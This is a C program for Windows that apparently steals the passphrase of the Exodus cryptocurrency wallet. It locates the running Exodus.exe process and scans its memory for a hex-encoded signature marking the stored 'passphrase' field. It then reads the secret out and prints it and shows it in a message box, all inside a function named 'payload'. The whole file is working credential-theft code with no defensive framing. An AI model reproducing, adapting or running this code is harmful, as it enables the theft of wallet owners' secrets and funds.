#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <Psapi.h>

#define MAX_PROCESSES 1024
#define MAX_PATH_LENGTH 260

typedef enum _MEMORY_INFORMATION_CLASS {
	MemoryBasicInformation
} MEMORY_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* NtQueryVirtualMemory_t)(HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS(NTAPI* NtReadVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);

HANDLE exodusHandle = INVALID_HANDLE_VALUE;
SYSTEM_INFO si;
DWORD64 address = 0;

BOOL getProc(const TCHAR* processName)
{
	DWORD processes[MAX_PROCESSES], cbNeeded, cProcesses;

	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded))
		return FALSE;

	cProcesses = cbNeeded / sizeof(DWORD);
	for (DWORD i = 0; i < cProcesses; i++)
	{
		if (processes[i] == 0)
			continue;

		TCHAR szProcessName[MAX_PATH_LENGTH] = TEXT("<unknown>");

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
			PROCESS_VM_READ,
			FALSE, processes[i]);

		if (hProcess)
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				GetModuleBaseName(hProcess, hMod, szProcessName,
					sizeof(szProcessName) / sizeof(TCHAR));
			}
		}

		if (_tcsicmp(szProcessName, processName) == 0) {
			exodusHandle = hProcess;
			return TRUE;
		}

		CloseHandle(hProcess);
	}

	return FALSE;
}

DWORD64 sigScan(const char* sig, const int sigSz, SIZE_T offset) {
	NtQueryVirtualMemory_t NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryVirtualMemory");
	NtReadVirtualMemory_t NtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");

	MEMORY_BASIC_INFORMATION mbi;
	char* currentMemPg = offset;

	while ((DWORD64)currentMemPg < (DWORD64)si.lpMaximumApplicationAddress) {
		NtQueryVirtualMemory(exodusHandle, currentMemPg, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);

		if (mbi.State != MEM_COMMIT) {
			currentMemPg += mbi.RegionSize;
			continue;
		}

		char* buff = (char*)malloc(mbi.RegionSize);

		if (buff == NULL) {
			printf("failed to allocate memory (buff)\n");
			return 1;
		}

		NtReadVirtualMemory(exodusHandle, currentMemPg, (PVOID)buff, mbi.RegionSize, NULL);

		/* pattern scan */
		for (int i = 0; i < mbi.RegionSize - sigSz; i++) {
			if (memcmp(&buff[i], sig, sigSz) != 0)
				continue;

			printf("found potential at: %p\n", &buff[i]);

			char* copyBuff = (char*)malloc(si.dwPageSize);

			if (copyBuff == NULL) {
				printf("failed to allocate memory (copyBuff)\n");
				free(buff);
				return 1;
			}

			memcpy(copyBuff, &buff[i], si.dwPageSize);

			if (memcmp(copyBuff, sig, sigSz) == 0) {
				printf("found at: %p\n", &buff[i]);
				printf("real address: %p\n", currentMemPg + i);

				free(copyBuff);
				free(buff);
				return currentMemPg + i;
			}

			free(copyBuff);
		}

		free(buff);
		currentMemPg += mbi.RegionSize;
	}
}

int payload() {
	NtQueryVirtualMemory_t NtQueryVirtualMemory = (NtQueryVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryVirtualMemory");
	NtReadVirtualMemory_t NtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");

	const char pwdSig[] = { 0x25, 0x35, 0x43, 0x25, 0x35, 0x43, 0x41, 0x70, 0x70, 0x44, 0x61, 0x74, 0x61, 0x25, 0x35, 0x43, 0x25,
						   0x35, 0x43, 0x52, 0x6F, 0x61, 0x6D, 0x69, 0x6E, 0x67, 0x25, 0x35, 0x43, 0x25, 0x35, 0x43, 0x45, 0x78,
						   0x6F, 0x64, 0x75, 0x73, 0x25, 0x35, 0x43, 0x25, 0x35, 0x43, 0x65, 0x78, 0x6F, 0x64, 0x75, 0x73, 0x2E,
						   0x77, 0x61, 0x6C, 0x6C, 0x65, 0x74, 0x25, 0x32, 0x32, 0x25, 0x32, 0x43, 0x25, 0x32, 0x32, 0x70, 0x61,
						   0x73, 0x73, 0x70, 0x68, 0x72, 0x61, 0x73, 0x65, 0x25, 0x32, 0x32, 0x25, 0x33, 0x41, 0x25, 0x32, 0x32 };
	const char pwdSigEnd[] = { 0x25, 0x32, 0x32, 0x25, 0x37, 0x44 };
	const int pwdSigSz = 85;

	/* double check exodus handle isn't invalid */
	if (exodusHandle == INVALID_HANDLE_VALUE) {
		printf("invalid handle\n");
		return 1;
	}

	GetSystemInfo(&si);

	/* sig scan */
	address = sigScan(pwdSig, pwdSigSz, 0) + pwdSigSz;
	DWORD64 endAddress = sigScan(pwdSigEnd, 6, address);

	char* pwd = (char*)malloc(endAddress - address);

	if (pwd == NULL) {
		printf("failed to allocate memory (pwd)\nmost likely no passphrase set\n");
		return 1;
	}

	NtReadVirtualMemory(exodusHandle, (PVOID)address, (PVOID)pwd, endAddress - address, NULL);
	printf("password: %s\n", pwd);

	MessageBoxA(NULL, pwd, "password", MB_OK);

	printf("success\n");
	return 0;
}

int main()
{
	if (getProc(TEXT("Exodus.exe")))
		payload();
	else
		printf("exodus not alive");
}